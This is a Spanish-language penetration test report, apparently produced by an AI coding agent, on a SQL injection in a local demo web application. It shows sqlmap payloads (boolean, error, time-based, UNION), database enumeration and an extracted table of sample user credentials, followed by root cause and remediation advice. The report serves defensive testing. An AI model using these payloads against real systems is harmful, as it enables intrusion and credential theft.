# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:35:03  
**Analista:** GitHub Copilot CLI  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del endpoint principal de la aplicación web. La explotación permitió extraer la totalidad de la base de datos `sqli_demo`, incluyendo credenciales de usuarios en texto plano.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (Error-based, UNION-based, Boolean-based Blind, Time-based Blind) |
| **Severidad** | Crítica (CVSS 9.8) |
| **Parámetro afectado** | `id` (GET) |
| **URL vulnerable** | `http://web.dev.local:8083/?id=1&Submit=Submit` |
| **DBMS** | MySQL 5 (MariaDB fork) |
| **SO del servidor** | Linux Debian |
| **Stack tecnológico** | PHP 8.1.33, Apache 2.4.65 |

---

## Prueba de Concepto (PoC)

### 1. Detección inicial - Error SQL
Al inyectar una comilla simple en el parámetro `id`, la aplicación devuelve un error SQL explícito:

**Request:**
```
GET /?id=1'&Submit=Submit
```

**Error expuesto:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma la vulnerabilidad y revela la ruta del fichero fuente (`/var/www/html/low.php`).

### 2. Vectores de inyección confirmados por sqlmap

| Tipo | Payload |
|------|---------|
| **Boolean-based blind** | `id=1' OR NOT 9498=9498#` |
| **Error-based** | `id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,...))-- XbML` |
| **Time-based blind** | `id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu` |
| **UNION query** | `id=1' UNION ALL SELECT NULL,CONCAT(...)#` |

---

## Explotación

### Bases de datos enumeradas
```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo    <-- objetivo
[*] sys
```

### Tablas en `sqli_demo`
```
+-------+
| users |
+-------+
```

### Datos extraídos - Tabla `users`

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

⚠️ **Las contraseñas están almacenadas en texto plano**, lo que agrava significativamente el impacto de la vulnerabilidad.

---

## Impacto

- **Confidencialidad:** Compromiso total — extracción de todos los registros de usuarios, incluyendo credenciales.
- **Integridad:** Alto riesgo — posibilidad de modificar o eliminar datos de la base de datos.
- **Disponibilidad:** Riesgo moderado — posibilidad de eliminar tablas o datos críticos.
- **Escalada:** Las credenciales expuestas podrían permitir acceso a otros sistemas si se reutilizan contraseñas.

---

## Causa Raíz

La aplicación construye la consulta SQL concatenando directamente la entrada del usuario sin sanitización ni uso de consultas parametrizadas (prepared statements), tal como se puede inferir del error expuesto en `/var/www/html/low.php:11`.

**Código vulnerable (inferido):**
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas parametrizadas:**
   ```php
   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Validar y sanitizar entradas:** Verificar que `id` sea un entero antes de usarlo.

3. **Hashear contraseñas:** Utilizar `password_hash()` con `PASSWORD_BCRYPT` en PHP. Nunca almacenar contraseñas en texto plano.

4. **Configurar manejo de errores:** Deshabilitar la exposición de errores SQL en producción (`display_errors = Off`).

5. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debería tener acceso a `information_schema` ni a otras bases de datos del sistema.

6. **WAF:** Considerar la implementación de un Web Application Firewall como capa adicional de defensa.

---

## Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica** de SQL Injection sin ningún tipo de mitigación. La explotación fue trivial y resultó en la extracción completa de la base de datos de usuarios con sus credenciales en texto plano. Se requiere remediación inmediata.
